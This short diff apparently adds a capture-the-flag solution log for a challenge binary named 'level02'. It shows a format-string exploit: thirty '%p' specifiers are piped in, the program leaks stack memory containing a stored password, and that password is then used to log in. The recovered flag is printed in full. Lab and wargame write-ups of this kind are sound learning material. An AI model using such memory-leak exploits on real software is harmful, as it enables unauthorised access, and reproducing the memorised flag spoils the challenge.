@@ -1,0 +1,8 @@
+-> (python -c 'print "%p" * 30'; python -c 'print "A"') | ./level02 
+0x7fffffffe4f0(nil)0x410x2a2a2a2a2a2a2a2a0x2a2a2a2a2a2a2a2a0x7fffffffe6e80x1f7ff9a080x41
+(nil)(nil)(nil)(nil)(nil)(nil)(nil)(nil)(nil)(nil)(nil)0x100000000(nil)0x756e505234376848
+0x45414a35617339510x377a7143574e67580x354a35686e4758730x48336750664b394d(nil)
+0x70257025702570250x70257025702570250x7025702570257025 does not have access!
+-> ./level02
+--[ Username: A
+--[ Password: Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H
